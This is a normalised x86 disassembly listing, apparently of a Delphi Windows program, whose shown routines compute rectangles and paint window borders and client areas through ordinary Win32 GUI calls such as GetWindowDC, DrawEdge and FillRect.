mov [ fs : eax ] edx
push sub_444185
mov eax [ ebp - 0x14 ]
call sub_403124
retn
mov edx edi
mov eax [ ebp - 0x14 ]
call sub_414164
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov ebx [ ebp - 0x10 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
inc ebx
mov eax [ ebp - 0x14 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax + 0x8 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_414108
mov edi eax
mov eax edi
mov si 0xffb8
call sub_403320
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x1a4 ] 0x0
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
mov eax [ edi + 0x30 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_444194
push ebp
mov ebp esp
push esi
mov esi edx
mov edx [ ebp + 0x8 ]
push edx
xor dl 0x1
push edx
mov edx esi
call sub_444088
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_4441c0
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_454618
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_444088
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0x0
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_444088
mov edx eax
mov eax esi
call sub_458284
sub_444204
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_440990
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_440954
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44424c
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_443908
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43d6f4
sub_444294
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x74 ]
cmp [ eax + 0x14 ] 0x0
jbe r-xdata
xor edx edx
mov [ edi ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x14 ]
mov [ edi ] edx
jmp r-xdata
xor edx edx
mov [ ecx ] edx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0x10 ]
mov [ ecx ] edx
jmp r-xdata
cmp [ eax + 0x10 ] 0x0
jbe r-xdata
mov edx [ ebp + 0xc ]
xor ebx ebx
mov [ edx ] ebx
mov edx [ esi + 0x74 ]
mov edx [ edx + 0xc ]
mov ebx [ ebp + 0xc ]
mov [ ebx ] edx
jmp r-xdata
cmp [ eax + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ esi + 0x74 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_444318
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax esi
call sub_443f64
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_440990
test eax eax
je r-xdata
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x5d ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8c ]
lea eax [ ebp - 0x5d ]
push eax
call IsRectEmpty
test eax eax
jne r-xdata
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x55 ]
sub edx [ ebp - 0x5d ]
sub eax edx
mov [ ebp - 0xc ] eax
mov edx [ esi + 0x4c ]
mov ecx [ ebp - 0x51 ]
sub ecx [ ebp - 0x59 ]
sub edx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
sub [ eax ] edx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
sub [ eax ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
sub [ eax ] edx
xor ecx ecx
push ebp
push sub_4446da
push [ fs : ecx ]
mov [ fs : ecx ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_440990
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax ] edx
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
inc edi
mov [ ebp - 0x1c ] 0x0
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jle r-xdata
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_444294
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
sub al 0x2
jb r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
test [ ebx + 0x51 ] 0x4
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
mov [ edx ] eax
mov eax [ ebp - 0x24 ]
add eax [ ebp - 0x34 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx ]
jle r-xdata
mov [ ebp - 0x4d ] 0x0
jmp r-xdata
mov [ ebp - 0x4d ] 0x1
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x1
jmp r-xdata
sub al 0x2
je r-xdata
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_440954
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
add eax [ ebp - 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov al [ ebx + 0x5b ]
sub al 0x1
jb r-xdata
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
sub eax [ ebx + 0x48 ]
sub eax [ ebp - 0x40 ]
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x4d ] 0x2
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x2c ]
add eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx ]
jle r-xdata
mov al [ ebx + 0x61 ]
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
add al 0xfe
sub al 0x2
jb r-xdata
mov eax [ ebp - 0x55 ]
sub eax [ ebp - 0x5d ]
add eax [ ebp - 0x44 ]
sub eax [ ebx + 0x48 ]
mov [ ebp - 0x44 ] eax
jmp r-xdata
mov [ ebp - 0x4d ] 0x3
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
xor eax eax
jmp r-xdata
mov al 0x1
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
mov al 0x1
jmp r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
mov dl [ ebp - 0x4d ]
dec edx
sub dl 0x2
jb r-xdata
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
sub edx [ ebx + 0x4c ]
sub edx [ ebp - 0x48 ]
mov [ ebp - 0x48 ] edx
mov al 0x2
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax ] edx
cmp [ ebp - 0x40 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp - 0x51 ]
sub edx [ ebp - 0x59 ]
add edx [ ebp - 0x4c ]
sub edx [ ebx + 0x4c ]
mov [ ebp - 0x4c ] edx
jmp r-xdata
mov al 0x3
cmp [ ebp - 0x44 ] 0x0
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x40 ]
jge r-xdata
mov edx [ ebx + 0x48 ]
add [ ebp - 0x30 ] edx
add [ ebp - 0x34 ] edx
jmp r-xdata
dec eax
sub al 0x2
jb r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x44 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x40 ]
mov [ edx ] ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
cmp edx [ ebp - 0x20 ]
jle r-xdata
cmp [ ebp - 0x48 ] 0x0
jle r-xdata
je r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x44 ]
mov [ edx ] ecx
mov edx [ ebp + 0xc ]
mov edx [ edx ]
cmp edx [ ebp - 0x24 ]
jle r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ ebp - 0x20 ] edx
cmp [ ebp - 0x4c ] 0x0
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x48 ]
jge r-xdata
mov eax [ ebx + 0x4c ]
add [ ebp - 0x38 ] eax
add [ ebp - 0x3c ] eax
jmp r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx ]
mov [ ebp - 0x24 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x4c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x48 ]
mov [ eax ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x28 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4c ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
sub_4446f1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_444318
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_43e4c8
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_444730
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43f34c
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0x74 ]
mov eax edi
call sub_43cdec
cmp [ edi + 0x158 ] 0x0
jne r-xdata
sub_444778
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f56c
mov eax esi
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx [ ebx + 0x158 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_4447a8
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
call sub_443f64
test al al
je r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x5
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb4 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax [ ebp - 0x4 ]
call sub_4404f8
xor ecx ecx
push ebp
push sub_4448d7
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
call sub_440990
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_440990
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4448de
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_440500
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_440954
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_4448de
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403320
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403320
jmp r-xdata
sub_444974
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_444a04
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_444c6a
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41e680
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_4335f0
call sub_4336d0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_4335f0
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_433e1c
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_444cac
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406948
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_43cfc8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44154c
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_43e62c
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_43f7f0
sub_444d18
push ebx
push esi
mov esi edx
call sub_454618
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_4068e4
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43e62c
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_4068e4
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_43e62c
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_444d7c
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_441914
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_444db4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_444dac
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_444df4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43c584
mov dl 0x1
mov eax [ r-xdata ]
call sub_41e79c
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_43c060
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_444e50
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403124
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43c65c
test bl bl
jle r-xdata
xor eax eax
call sub_43a654
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_444e90
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41eaa0
xor eax eax
push ebp
push sub_444f2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_41ee14
xor eax eax
push ebp
push sub_444f08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444f0f
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_41ee14
retn
sub_444f3c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_445874
mov edx 0x80ffff
mov eax esi
call sub_43d624
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_41ecb4
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_41e768
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_444fa8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
